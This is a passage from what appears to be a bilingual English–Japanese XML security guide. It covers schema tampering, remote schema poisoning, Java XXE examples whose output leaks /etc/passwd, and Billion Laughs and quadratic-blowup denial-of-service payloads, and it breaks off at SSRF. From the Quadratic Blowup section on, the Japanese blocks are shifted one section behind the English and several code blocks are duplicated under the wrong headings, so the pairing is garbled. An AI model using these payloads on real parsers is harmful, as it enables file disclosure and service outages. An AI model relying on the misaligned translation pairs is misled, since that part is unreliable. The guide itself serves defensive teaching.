**However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**しかし、ローカルスキーマに正しい権限が設定されていない場合、内部攻撃者が元の制約を変更できる可能性があります。** 次の行は、任意のユーザーが変更できる権限を持つスキーマの例です。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`name.dtd` に設定された権限により、システム上の任意のユーザーが変更を加えられます。この脆弱性は XML やスキーマの構造とは明らかに関係ありませんが、これらの文書は一般にファイルシステムに保存されるため、攻撃者がこの種の問題を悪用できることは言及する価値があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Remote Schema Poisoning

**Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### リモートスキーマポイズニング

**外部組織によって定義されるスキーマは通常、リモートで参照されます。攻撃者がネットワークトラフィックを迂回またはアクセスできる場合、本来意図されたものとは異なる種類のコンテンツを被害者に取得させる可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Man-in-the-Middle (MitM) Attack

When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. **When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### Man-in-the-Middle (MitM) 攻撃

文書が暗号化されていない Hypertext Transfer Protocol (HTTP) を使用してリモートスキーマを参照する場合、通信は平文で行われ、攻撃者はトラフィックを容易に改ざんできます。**XML 文書が HTTP 接続を使用してリモートスキーマを参照する場合、その接続はエンドユーザーに届く前に盗聴および変更される可能性があります。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

リモートファイル `note.dtd` は、暗号化されていない HTTP プロトコルで送信される場合、改ざんされやすい可能性があります。この種の攻撃を容易にするために利用できるツールの一つが mitmproxy です。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### DNS-Cache Poisoning

Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). **When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname.** In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### DNS キャッシュポイズニング

リモートスキーマポイズニングは、Hypertext Transfer Protocol Secure (HTTPS) のような暗号化プロトコルを使用している場合でも可能なことがあります。**ソフトウェアが IP アドレスに対して逆 Domain Name System (DNS) 解決を実行してホスト名を取得する場合、その IP アドレスが本当にそのホスト名に関連付けられていることを適切に保証しない可能性があります。** この場合、ソフトウェアは攻撃者がコンテンツを自分の Internet Protocol (IP) アドレスにリダイレクトできるようにします。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous example referenced the host `example.com` using an unencrypted protocol.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述の例では、暗号化されていないプロトコルを使用してホスト `example.com` を参照していました。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

When switching to HTTPS, the location of the remote schema will look like `https://example/note.dtd`. In a normal scenario, the IP of `example.com` resolves to `1.1.1.1`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

HTTPS に切り替えると、リモートスキーマの場所は `https://example/note.dtd` のようになります。通常のシナリオでは、`example.com` の IP は `1.1.1.1` に解決されます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ host example.com
example.com has address 1.1.1.1
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

攻撃者が使用中の DNS を侵害すると、前述のホスト名は攻撃者が制御する新しい別の IP `2.2.2.2` を指す可能性があります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ host example.com
example.com has address 2.2.2.2
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

リモートファイルにアクセスすると、被害者は実際には攻撃者が制御する場所の内容を取得している可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### Evil Employee Attack

When third parties host and define schemas, the contents are not under the control of the schemas' users. **Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### 悪意ある従業員による攻撃

第三者がスキーマをホストして定義している場合、その内容はスキーマ利用者の管理下にはありません。**悪意ある従業員、またはこれらのファイルを制御する外部攻撃者によって導入された変更は、スキーマを処理するすべてのユーザーに影響する可能性があります。その後、攻撃者はほかのサービスの機密性、完全性、可用性に影響を与える可能性があります (特に使用中のスキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の場合)。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### XML Entity Expansion

**If the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XML エンティティ展開

**パーサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用する場合、攻撃者は文書処理中に XML パーサへ悪影響を与える可能性のあるデータを注入するかもしれません。これらの悪影響には、パーサのクラッシュやローカルファイルへのアクセスが含まれる可能性があります。**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Sample Vulnerable Java Implementations

**Using the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect file confidentiality.** In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 脆弱な Java 実装のサンプル

**ローカルまたはリモートファイルを参照する [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の機能を使用すると、ファイルの機密性に影響を与えることが可能です。** さらに、エンティティ展開に適切な制約が設定されていない場合、リソースの可用性にも影響を与えることが可能です。XXE の次のサンプルコードを考えてください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**Sample XML**:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**サンプル XML**:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**Sample DTD**:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

**サンプル DTD**:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### XXE using DOM

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### DOM を使った XXE

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous code produces the following output:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のコードは次の出力を生成します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### XXE using DOM4J

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### DOM4J を使った XXE

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous code produces the following output:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のコードは次の出力を生成します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### XXE using SAX

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### SAX を使った XXE

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous code produces the following output:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のコードは次の出力を生成します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

##### XXE using StAX

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

##### StAX を使った XXE

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The previous code produces the following output:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

前述のコードは次の出力を生成します。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Quadratic Blowup

**Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).**

The result of the following attack will be 100,000 x 100,000 characters in memory.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 再帰的エンティティ参照

**要素 `A` の定義が別の要素 `B` であり、その要素 `B` が要素 `A` として定義されている場合、そのスキーマは要素間の循環参照を表します。**

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

```xml
<!DOCTYPE A [
 <!ELEMENT A ANY>
 <!ENTITY A "<A>&B;</A>">
 <!ENTITY B "&A;">
]>
<A>&A;</A>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Billion Laughs

**When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.** This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 二次的爆発

**このシナリオでは、攻撃者は複数の小さく深くネストされたエンティティを定義する代わりに、一つの非常に大きなエンティティを定義し、それを可能な限り何度も参照します。その結果、二次的な展開 (*O(n^2)*) が発生します。**

次の攻撃の結果は、メモリ上で 100,000 x 100,000 文字になります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.

**The Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.**

The following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### Billion Laughs

**XML パーサが次のコードに含まれる外部エンティティを解決しようとすると、プロセスがクラッシュするまで、アプリケーションは利用可能なメモリをすべて消費し始めます。** これは、攻撃を含む埋め込み [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを持つ XML 文書の例です。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Reflected File Retrieval

Consider the following example code of an XXE:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

エンティティ `LOL9` は `LOL8` に定義された 10 個のエンティティとして解決され、その後、それぞれのエンティティが `LOL7` 内で解決される、というように続きます。最終的に、このスキーマで定義された `3 x 10^9` (3,000,000,000) 個のエンティティを解析することで CPU やメモリが影響を受け、パーサがクラッシュする可能性があります。

**Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) 仕様は [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を完全に禁止しています。これは、SOAP プロセッサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を含む任意の SOAP メッセージを拒否できることを意味します。この仕様にもかかわらず、一部の SOAP 実装は SOAP メッセージ内の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを解析していました。**

次の例は、パーサが仕様に従っておらず、SOAP メッセージ内で [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) への参照を有効にしているケースを示しています。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

**The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 反射型ファイル取得

XXE の次のサンプルコードを考えてください。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Server Side Request Forgery

**Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.** SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

